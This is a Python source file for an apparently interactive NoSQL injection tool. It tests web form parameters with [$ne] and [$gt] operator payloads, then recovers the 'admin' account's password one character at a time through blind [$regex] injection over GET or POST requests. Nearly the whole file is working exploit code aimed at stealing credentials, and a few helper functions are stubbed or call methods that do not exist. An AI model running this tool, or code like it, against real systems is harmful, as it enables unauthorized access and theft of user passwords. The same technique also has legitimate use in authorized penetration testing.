import requests
import urllib3
import urllib
from _helper import *
import random
import string
from requests_html import HTMLSession
from termcolor import colored

try:
    from BeautifulSoup import BeautifulSoup
except ImportError:
    from bs4 import BeautifulSoup
urllib3.disable_warnings()

def vulnTest(nsi):
  
  arr = ['[$ne]', '[$gt]']
  x = Str.randStr(8)
  phaseTest = None
  session = HTMLSession()
  vulnerable = []
  
  for v in arr:
    phaseTest = v
    form_data = {}
    for element in nsi.params:
      element = element.replace("*", "")
      if (v == '[$gt]'):
        form_data[element+v] = '&'
      else:
        form_data[element+v] = x

    if (nsi.reqMethod == '1') : #get
      reqData = Str.http_build_query(form_data)
      r = session.get(nsi.url)
      rInj = session.get(nsi.url+'?'+reqData)
    else:
      r = requests.post(nsi.url)
      rInj = session.post(nsi.url, data=form_data)
      # print("ori:"+r.text)
      # print("inj:"+rInj.text)
      
    resOri = BeautifulSoup(r.text, 'lxml')
    resInj = BeautifulSoup(rInj.text, 'lxml')
    
    if resOri.body == resInj.body:
        vulnerable.append({
          v: False
        })
        print(colored(f"Not vulnerable with {phaseTest} Injection", 'red'))
    else:
        vulnerable.append({
          v: True
        })
        nsi.successIdentifier = rInj.text
        print(colored(f"Possible vulnerable to {phaseTest} Injection!", 'green'))

  return vulnerable

def isVulnerable(arr):
  for item in arr:
    if True in item.values():
        return True
  else:
      return False

def typeReqPayload(nsi):
  print(nsi.info())
  print(colored("\n=================\n[Request Method]\n\n1) Send Request as GET\n2) Send Request as POST\n", "yellow"))
  nsi.reqMethod = input("Choose Request Method >>")
  return nsi.reqMethod
  
def paramMenu(nsi):
  print(nsi.info())
  print(colored(f"\n=================\n[Configuration Parameter]\n\n1) Payload random value\n2) Payload custom value\n", "yellow"))
  nsi.typeParam = input("Choose One >>")
  while nsi.param != 'd':
    print('press "d" for submit the param')
    nsi.param = input("Input Param >>")
    
    if (nsi.param != 'd'):
      nsi.params.append(nsi.param)
  return nsi.typeParam

def algMenu(nsi):
  print(nsi.info())
  print(colored("\n=================\n[Choose Algorithm]\n\n1) Linear Search\n2) Binary Search\n", "yellow"))
  nsi.alg = input("Choose Algorithm >>")
  return nsi.alg

def slinearPost(nsi):
  username="admin"
  password=""
  length=""
  
  #count length
  for c in range(0, 9999999):
    form_data = {}
    for element in nsi.params:
      if ("*" in element):
        element = element.replace("*", "")
        form_data[element+'[$regex]'] = "^.{"+str(c)+"}$"
      else:
        form_data[element+'[$eq]'] = username
    
    r = requests.post(nsi.url, data = form_data, verify = False)
      
    if nsi.successIdentifier in r.text:
      print("Found length : %s" % (c))
      length = c
      break
  
  for x in range(length):
    for c in string.printable:
      if c not in ['*','+','.','?','|', "'", '"', '&', ' ']:
        form_data = {}
        for element in nsi.params:
          if ("*" in element):
            element = element.replace("*", "")
            form_data[element+'[$regex]'] = f"^{urllib.parse.quote_plus(password+c)}"
          else:
            form_data[element+'[$eq]'] = username
        r = requests.post(nsi.url, data = form_data, verify = False)
        
        if nsi.successIdentifier in r.text:
            print("Result : %s" % (password+c), end='\r')
            password += c
            break
  print("Result : %s" % (password))

def slinearGet(nsi):
  username="admin"
  password=""
  length=""
  
  #count length
  for c in range(0, 9999999):
    form_data = {}
    for element in nsi.params:
      if ("*" in element):
        element = element.replace("*", "")
        form_data[element+'[$regex]'] = "^.{"+str(c)+"}$"
      else:
        form_data[element+'[$eq]'] = username
    reqData = Str.http_build_query(form_data)
    r = requests.get(nsi.url+'?'+reqData, verify = False)
      
    if nsi.successIdentifier in r.text:
      print("Found length : %s" % (c))
      length = c
      break
    
  for x in range(length):
    for c in string.printable:
      if c not in ['*','+','.','?','|', "'", '"', '&', ' ', '(', ')', '[', ']', '\\']:
        form_data = {}
        for element in nsi.params:
          if ("*" in element):
            element = element.replace("*", "")
            form_data[element+'[$regex]'] = f"^{urllib.parse.quote_plus(password+c)}"
          else:
            form_data[element+'[$eq]'] = username
        reqData = Str.http_build_query(form_data)
        # print(reqData)
        r = requests.get(nsi.url+'?'+reqData,verify = False)
        
        if nsi.successIdentifier in r.text:
            print("Result : %s" % (password+c), end='\r')
            password += c
            break
  print("Result : %s" % (password))
            
def sbin(nsi):
  return 0

def getResponseBodyHandlingErrors(req):
    try:
        responseBody = urllib3.urlopen(req).read()
    except urllib3.HTTPError as err:
        responseBody = err.read()
    
    return responseBody

def checkWeb(url):
  print("Checking to see if site at " +str(url).strip() + " is up...")
  tester = WebAppTester(url)
  if tester.is_up():
      print("The target is up. Starting injection test !")
  else:
      print("The target is might be down")
  return 0